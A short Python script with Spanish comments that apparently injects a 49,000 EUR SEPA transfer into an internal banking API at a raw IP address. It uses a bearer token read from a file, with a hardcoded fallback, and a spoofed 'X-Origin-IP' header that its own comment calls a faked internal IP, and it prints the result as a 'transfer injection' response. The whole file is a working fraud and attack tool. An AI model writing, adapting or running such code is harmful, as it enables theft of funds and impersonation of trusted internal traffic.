import requests
import uuid

# Cargar token desde el archivo generado en login
try:
    with open("interno_token.txt", "r") as tokfile:
        access_token = tokfile.read().strip()
except FileNotFoundError:
    access_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1hcmttdXI4OCIsImlhdCI6MTc1MTc3NjU3OCwiZXhwIjoxNzUxNzgwMTc4fQ.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

# === Datos de la transferencia SEPA ===
payload = {
    "payment_id": str(uuid.uuid4()),  # ✅ Generamos un payment_id único como en modelo interno
    "iban_origen": "ES8000180001234567890123",  # Reemplázalo con tu cuenta origen
    "iban_destino": "ES9100289392790001457822",  # Reemplázalo con tu cuenta destino
    "reason": "Traspaso interbancario autorizado",
    "monto": 49000.00,
    "currency": "EUR",
    "requested_execution_date": "2025-07-06"
}

# === Headers internos ===
session = requests.Session()
session.headers.update({
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "application/xml,application/xhtml+xml,text/html,application/json",
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {access_token}",  # Ya tienes sesión JWT
    "X-Origin-IP": "192.168.1.10",           # IP fingida interna
    "X-Location": "OFICINA-ES-MADRID-9181",
})

# === Enviar la transferencia ===
transfer_url = "http://80.78.30.242:9181/api/send-transfer"
xfer_response = session.post(transfer_url, json=payload)

print("[+] Respuesta de inyección de transferencia:")
print("Status code:", xfer_response.status_code)
print("Respuesta:", xfer_response.text)